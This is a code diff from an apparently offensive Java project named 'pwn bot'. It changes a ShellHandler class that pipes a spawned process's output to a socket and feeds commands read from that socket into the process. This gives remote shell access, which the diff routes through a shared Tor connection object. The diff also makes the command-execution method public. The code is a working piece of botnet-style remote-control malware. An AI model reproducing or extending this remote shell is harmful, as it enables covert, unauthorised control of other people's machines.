@@ -1,5 +1,6 @@
 package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.handlers;
 
+import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
@@ -20,9 +21,6 @@ public class ShellHandler {
     private Thread shellThreadWriter;
 
     private ProcessBuilder processBuilder;
-
-    PrintWriter socketWrite;
-    BufferedReader socketRead;
 
     PrintWriter commandWrite;
     BufferedReader commandRead;
@@ -47,8 +45,8 @@ public class ShellHandler {
                 commandRead = new BufferedReader(new InputStreamReader(p.getInputStream()));
                 String line;
                 while ((line = commandRead.readLine()) != null) {
-                    socketWrite.println(line);
-                    socketWrite.flush();
+                    CommonHeader.getTOR_HEADER().getSocketWrite().println(line);
+                    CommonHeader.getTOR_HEADER().getSocketWrite().flush();
                 }
                 p.destroy();
             } catch (Exception e) {
@@ -61,7 +59,7 @@ public class ShellHandler {
     public void getCommand() {//TODO IN MAIN THREAD ?
         String foo;
         try {
-            while ((foo = socketRead.readLine()) != null) {
+            while ((foo = CommonHeader.getTOR_HEADER().getSocketRead().readLine()) != null) {
                 commandWrite.println(foo);
                 commandWrite.flush();
             }
@@ -70,7 +68,7 @@ public class ShellHandler {
         }
     }
 
-    void executeCMD(String line) {
+    public void executeCMD(String line) {
         commandWrite.println(line);
         commandWrite.flush();
     }
